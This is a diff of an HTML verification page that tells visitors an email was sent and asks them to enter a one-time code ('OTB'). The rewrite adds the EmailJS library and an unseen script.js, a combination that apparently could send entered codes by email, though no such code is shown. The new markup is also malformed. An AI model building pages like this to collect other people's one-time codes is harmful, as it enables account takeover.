@@ -1,233 +1,39 @@
 <!DOCTYPE html>
-<html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta http-equiv="X-UA-Compatible" content="IE=edge">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-
-    <title>OTB Verification</title>
-
-    <style>
-        * {
-            box-sizing: border-box;
-            margin: 0;
-            padding: 0;
-        }
-
-        body {
-            font-family: Arial, Helvetica, sans-serif;
-            background: #2864e8;
-            min-height: 100vh;
-            display: flex;
-            justify-content: center;
-            color: white;
-        }
-
-        .container {
-            width: 100%;
-            max-width: 700px;
-            text-align: center;
-            padding: 30px;
-        }
-
-        .title {
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            gap: 12px;
-            margin-bottom: 115px;
-        }
-
-        .user-icon {
-            position: relative;
-            width: 32px;
-            height: 32px;
-        }
-
-        .user-icon::before {
-            content: "";
-            position: absolute;
-            width: 13px;
-            height: 13px;
-            border: 2px solid rgba(255, 255, 255, 0.6);
-            border-radius: 50%;
-            top: 0;
-            left: 8px;
-        }
-
-        .user-icon::after {
-            content: "";
-            position: absolute;
-            width: 20px;
-            height: 12px;
-            border: 2px solid rgba(255, 255, 255, 0.6);
-            border-radius: 20px 20px 0 0;
-            bottom: 2px;
-            left: 4px;
-        }
-
-        h1 {
-            font-size: 42px;
-            font-weight: 500;
-            line-height: 1.1;
-            text-align: left;
-        }
-
-        .code-title {
-            font-size: 24px;
-            margin-bottom: 20px;
-        }
-
-        .input-container {
-            position: relative;
-            width: 100%;
-            margin-bottom: 250px;
-        }
-
-        .code-input {
-            width: 100%;
-            height: 70px;
-
-            border: none;
-            border-radius: 80px;
-
-            padding: 25px 50px 8px 20px;
-
-            font-size: 18px;
-            outline: none;
-
-            background: rgba(255, 255, 255, 0.95);
-            color: #333;
-
-            transition: 0.2s;
-        }
-
-        .code-input:focus {
-            box-shadow: 0 0 0 3px rgba(255, 255, 255, 0.3);
-        }
-
-        .input-label {
-            position: absolute;
-            left: 25px;
-            top: 10px;
-
-            font-size: 12px;
-            color: #777;
-
-            pointer-events: none;
-        }
-
-        .close {
-            position: absolute;
-            right: 25px;
-            top: 23px;
-
-            color: #555;
-            font-size: 22px;
-
-            cursor: pointer;
-
-            transition: 0.2s;
-        }
-
-        .close:hover {
-            color: #000;
-        }
-
-        button {
-            width: 72%;
-            height: 58px;
-
-            border: none;
-            border-radius: 30px;
-
-            background: #eeeeee;
-            color: #333;
-
-            font-size: 18px;
-
-            cursor: pointer;
-
-            transition: 0.2s;
-        }
-
-        button:hover {
-            background: white;
-            transform: scale(1.02);
-        }
-
-        @media (max-width: 600px) {
-
-            h1 {
-                font-size: 30px;
-            }
-
-            .title {
-                margin-bottom: 80px;
-            }
-
-            .input-container {
-                margin-bottom: 180px;
-            }
-
-            button {
-                width: 90%;
-            }
-        }
-    </style>
+  <title>OTB</title>
+  <link rel="stylesheet" href="style.css">
+  <body class="BY">
+      
 </head>
-
-<body>
-
     <div class="container">
 
-        <div class="title">
+        <div class="login-card">
+            <header class="header">
+      <img class="logo" src="https://cdn-icons-png.flaticon.com/512/1077/1077114.png" alt="Login Icon">
+      <h1 class="logintxt">WE JUST SENT AN EMAIL<br>
+                
+    </header>
 
-            <div class="user-icon"></div>
-
-            <h1>
-                WE JUST SENT AN<br>
-                EMAIL
-            </h1>
-
+    <div class="form-container">
+      <label class="email-label"></label>
+      
+      <div class="input-box">
+          <div class="input-row">
+              <input type="email" placeholder="OTB" class="custom-input email-input">
         </div>
-
-        <div class="code-title">
-            The code:
-        </div>
-
-        <div class="input-container">
-
-            <span class="input-label">
-                Input
-            </span>
-
-            <input
-                type="text"
-                class="code-input"
-                id="code"
-            >
-
-            <span
-                class="close"
-                onclick="clearCode()"
-            >
-                ×
-            </span>
-
-        </div>
-
-        <button class="submit-code">
-            lets go!
-        </button>
-
+      </div>
+      
+      <p class="text">PUT YOU OTB</p>
     </div>
+</div>
+<button type="submit" class="send-btn">LETS GO</button>
+</div>
 
-    <script>
-        function clearCode() {
-            document.getElementById("code").value = "";
-        }
-    </script>
+<script
+  type="text/javascript"
+  src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js">
+</script>
 
+<script src="script.js"></script>
 </body>
 </html>
